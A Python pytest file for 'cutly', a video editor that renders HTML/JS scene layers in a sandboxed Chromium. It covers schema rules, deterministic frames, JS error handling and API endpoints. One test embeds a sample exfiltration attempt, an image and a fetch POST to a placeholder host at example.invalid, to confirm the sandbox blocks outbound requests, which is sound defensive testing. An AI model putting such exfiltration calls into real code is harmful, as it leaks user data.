"""Capa `scene` con `code`: HTML/JS autocontenido renderizado con un navegador aislado y reloj determinista.

Estos tests necesitan Chromium real (misma dependencia que usa el motor en producción): se saltan solos si
`playwright` o el navegador del sistema no están disponibles, en vez de fallar en un entorno que no los tiene.
"""

import io
from pathlib import Path

import numpy as np
import pytest
from PIL import Image
from pydantic import ValidationError

from cutly.schema.project import ProjectDoc, SceneLayer

API = "/api/v1"

pw = pytest.importorskip("playwright.sync_api", reason="playwright no está instalado (extra opcional scene-js)")
if not Path("/usr/bin/chromium").is_file():
    pytest.skip("no hay un Chromium del sistema en esta máquina", allow_module_level=True)

from cutly.services.scene_js import renderer as R  # noqa: E402


def canvas_html(bg: str = "#102030", label: str = "hola") -> str:
    """Un documento mínimo: fondo sólido + un texto que crece con el tiempo (determinista si el reloj lo es)."""
    return f"""<!doctype html><html><body style="margin:0;background:#000">
<canvas id="c" width="320" height="320"></canvas>
<script>
const c = document.getElementById('c').getContext('2d');
function frame(now) {{
  c.fillStyle = now % 2000 < 1000 ? '{bg}' : '#e04040';
  c.fillRect(0, 0, 320, 320);
  c.fillStyle = '#fff'; c.font = '28px sans-serif';
  c.fillText('{label} ' + Math.round(now), 20, 60 + Math.min(now / 10, 280));
  requestAnimationFrame(frame);
}}
requestAnimationFrame(frame);
</script></body></html>"""


# --- esquema -----------------------------------------------------------------------------------------------------


def test_scene_layer_accepts_code_as_a_third_exclusive_source():
    layer = SceneLayer(end=5, code=canvas_html())
    assert layer.template is None and layer.scene is None and layer.code
    with pytest.raises(ValidationError, match="exactamente una"):
        SceneLayer(end=5, code=canvas_html(), template="title_card")
    with pytest.raises(ValidationError, match="exactamente una"):
        SceneLayer(end=5)
    with pytest.raises(ValidationError, match="HTML"):
        SceneLayer(end=5, code="no es html")
    with pytest.raises(ValidationError, match="fps"):
        SceneLayer(end=5, template="title_card", fps=24)  # fps solo tiene sentido con code
    assert SceneLayer(end=5, code=canvas_html(), fps=24).fps == 24


def test_project_accepts_a_code_scene_layer():
    doc = ProjectDoc.model_validate(
        {
            "media_id": "m",
            "layers": [{"type": "scene", "end": 5, "code": canvas_html(), "box": {"x": 0.5, "y": 0.5, "w": 1.0}}],
        }
    )
    assert doc.layers[0].code


# --- motor: determinismo, seguridad, errores ------------------------------------------------------------------------


def test_renders_are_deterministic_across_sessions():
    a = R.render_js_preview(canvas_html(), 320, 320, [0.5, 1.2], 30)
    b = R.render_js_preview(canvas_html(), 320, 320, [0.5, 1.2], 30)
    assert len(a) == len(b) == 2
    for fa, fb in zip(a, b, strict=True):
        assert np.array_equal(np.asarray(fa), np.asarray(fb))


def test_frame_changes_over_time():
    early, late = R.render_js_preview(canvas_html(), 320, 320, [0.2, 3.0], 30)
    assert not np.array_equal(np.asarray(early), np.asarray(late))


def test_network_requests_are_blocked():
    html = """<!doctype html><html><body>
<img src="https://example.invalid/leak.png">
<script>
window.__ok = false;
fetch("https://example.invalid/exfil", {method:"POST", body:"x"}).catch(() => { window.__ok = true; });
function frame(){ requestAnimationFrame(frame); } requestAnimationFrame(frame);
</script></body></html>"""
    session = R._Session(html, 100, 100)
    try:
        session.tick(500)  # tiempo de sobra para que el fetch (bloqueado) rechace su promesa
        ok = session.page.evaluate("window.__ok")
    finally:
        session.close()
    assert ok is True  # el fetch fue efectivamente rechazado: nada salió a la red


def test_js_syntax_error_is_reported_without_crashing_the_render(tmp_path):
    warnings: list[str] = []
    layer = SceneLayer(end=2, code="<html><body><script>definitely not valid js (</script></body></html>")
    seq = R.render_js_sequence(layer, 200, 200, 10, tmp_path, warnings)
    assert seq is None and warnings and "error" in warnings[0].lower()


def test_runtime_error_mid_animation_still_yields_the_frames_before_it(tmp_path):
    html = """<!doctype html><html><body style="margin:0;background:#000">
<canvas id="c" width="100" height="100"></canvas>
<script>
const c = document.getElementById('c').getContext('2d');
let n = 0;
function frame(now){
  c.fillStyle = '#204060'; c.fillRect(0,0,100,100);
  n++;
  if (n > 5) { null.boom(); }
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);
</script></body></html>"""
    warnings: list[str] = []
    layer = SceneLayer(end=2, code=html)
    seq = R.render_js_sequence(layer, 100, 100, 10, tmp_path, warnings)
    assert seq is not None and 0 < seq.frames <= 6  # se corta justo al 6º tick (n > 5)
    assert any("interrumpida" in w for w in warnings)


def test_box_pixels_without_height_assumes_output_aspect():
    layer = SceneLayer(end=5, code=canvas_html(), box={"x": 0.5, "y": 0.5, "w": 1.0})
    x0, y0, bw, bh = R.box_pixels(layer, 1080, 1920)
    assert (bw, bh) == (1080, 1920) and (x0, y0) == (0, 0)


def test_sequence_only_generates_frames_in_window(tmp_path):
    warnings: list[str] = []
    layer = SceneLayer(start=1.0, end=6.0, code=canvas_html())
    full = R.render_js_sequence(layer, 160, 160, 10, tmp_path / "a", warnings)
    part = R.render_js_sequence(layer, 160, 160, 10, tmp_path / "b", warnings, window=(3.0, 3.5))
    assert full and part and full.frames > part.frames
    assert warnings == []


# --- API --------------------------------------------------------------------------------------------------------


def test_preview_endpoint_accepts_code(writer):
    r = writer.post(
        f"{API}/scenes/preview",
        json={"code": canvas_html(), "times": [0.5, 1.5], "width": 320, "height": 320, "cols": 2},
    )
    assert r.status_code == 200 and r.headers["content-type"] == "image/png"
    im = Image.open(io.BytesIO(r.content))
    assert im.size == (640, 320)
    both = writer.post(f"{API}/scenes/preview", json={"code": canvas_html(), "template": "title_card"})
    assert both.status_code == 422
    neither = writer.post(f"{API}/scenes/preview", json={})
    assert neither.status_code == 422
    bad_js = writer.post(f"{API}/scenes/preview", json={"code": "<html><script>!!!(</script></html>", "times": [0.1]})
    assert bad_js.status_code == 422


def test_live_doc_endpoint_serves_the_harness_without_the_strict_csp(writer):
    """Lo usa el <iframe> en vivo del editor (scene-live.js), navegado con un <form method="POST">: `srcdoc`/
    `blob:` heredan la CSP estricta del editor y bloquean en silencio cualquier <script> inline (harness
    incluido) — confirmado con Chromium real. Esta respuesta debe ir SIN esa CSP para poder ejecutarlos."""
    html = "<!doctype html><html><head><meta charset='utf-8'></head><body>hola</body></html>"
    r = writer.post(f"{API}/scenes/live-doc", data={"code": html})
    assert r.status_code == 200
    assert "content-security-policy" not in {k.lower() for k in r.headers}
    assert r.headers["x-frame-options"] == "SAMEORIGIN"
    assert "__cutly" in r.text and "<head" in r.text.split("__cutly")[0]
    assert r.text.rstrip().endswith("hola</body></html>")
    # sin <head> (solo <html>): el harness se antepone igualmente, justo tras <html ...>
    no_head = writer.post(f"{API}/scenes/live-doc", data={"code": "<html><body>x</body></html>"})
    assert "__cutly" in no_head.text
    too_big = writer.post(f"{API}/scenes/live-doc", data={"code": "x" * 300_001})
    assert too_big.status_code == 422


def test_build_endpoint_rejects_code(writer):
    r = writer.post(f"{API}/scenes/build", json={"code": canvas_html()})
    assert r.status_code == 422


def test_add_code_scene_layer_and_render_it_end_to_end(writer, sample_video):
    mid = writer.post(f"{API}/media/simple", params={"filename": "v.mp4"}, content=sample_video.read_bytes()).json()[
        "media_id"
    ]
    project = writer.post(
        f"{API}/projects", json={"media_id": mid, "source_in": 0, "source_out": 3, "name": "P"}
    ).json()
    pid = project["id"]
    layer = {
        "type": "scene",
        "start": 0.2,
        "end": 2.2,
        "code": canvas_html(),
        "box": {"x": 0.5, "y": 0.5, "w": 1.0, "h": 1.0},
        "fps": 15,
    }
    r = writer.post(f"{API}/projects/{pid}/ops", json={"ops": [{"op": "add_layer", "layer": layer}]})
    assert r.status_code == 200, r.text

    before = writer.get(f"{API}/projects/{pid}/frame", params={"t": 0.3, "quality": "preview"})
    during = writer.get(f"{API}/projects/{pid}/frame", params={"t": 1.5, "quality": "preview"})
    assert before.status_code == during.status_code == 200
    a = np.asarray(Image.open(io.BytesIO(before.content)).convert("RGB"), dtype=np.int16)
    b = np.asarray(Image.open(io.BytesIO(during.content)).convert("RGB"), dtype=np.int16)
    assert np.abs(a - b).mean() > 1  # la escena cambia con el tiempo

    job = writer.post(f"{API}/projects/{pid}/render", json={"quality": "draft"}).json()["job_id"]
    j = writer.get(f"{API}/jobs/{job}").json()
    assert j["status"] == "done", j
    assert j["result"]["warnings"] == []
    assert Path(j["result"]["path"]).stat().st_size > 5_000


def test_render_gives_the_scene_the_spoken_words_and_params(writer, sample_video):
    """Verde = la escena recibió CUTLY_WORDS (con la palabra esperada) y CUTLY_PARAMS en el render real."""
    from sqlmodel import Session

    from cutly.db.models import Transcript
    from cutly.db.session import get_engine

    mid = writer.post(f"{API}/media/simple", params={"filename": "v.mp4"}, content=sample_video.read_bytes()).json()[
        "media_id"
    ]
    with Session(get_engine()) as s:
        words = [{"w": "hola", "start": 0.6, "end": 0.9, "p": 1}, {"w": "cupón", "start": 1.0, "end": 1.4, "p": 1}]
        s.add(Transcript(media_id=mid, segments=[{"id": 0, "start": 0.6, "end": 1.4, "text": "x", "words": words}]))
        s.commit()
    pid = writer.post(f"{API}/projects", json={"media_id": mid, "source_in": 0, "source_out": 3}).json()["id"]
    code = """<!doctype html><html><body style="margin:0"><canvas id="c"></canvas><script>
const c=document.getElementById('c'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;
function f(){const w=CUTLY_WORDS.find(v=>v.w==='cupón');
 x.fillStyle=(w&&Math.abs(w.start-0.8)<0.01&&CUTLY_PARAMS.k===7)?'#00ff00':'#ff0000';x.fillRect(0,0,c.width,c.height);
 requestAnimationFrame(f)}requestAnimationFrame(f)</script></body></html>"""
    layer = {"type": "scene", "start": 0.2, "end": 2.2, "code": code, "params": {"k": 7}, "fps": 10}  # cupón: 1.0 - 0.2
    assert writer.post(f"{API}/projects/{pid}/ops", json={"ops": [{"op": "add_layer", "layer": layer}]}).status_code == 200
    fr = writer.get(f"{API}/projects/{pid}/frame", params={"t": 1.0, "quality": "preview"})
    px = np.asarray(Image.open(io.BytesIO(fr.content)).convert("RGB"), dtype=np.int16)
    mean = px.reshape(-1, 3).mean(axis=0)
    assert mean[1] > 200 and mean[0] < 60, mean
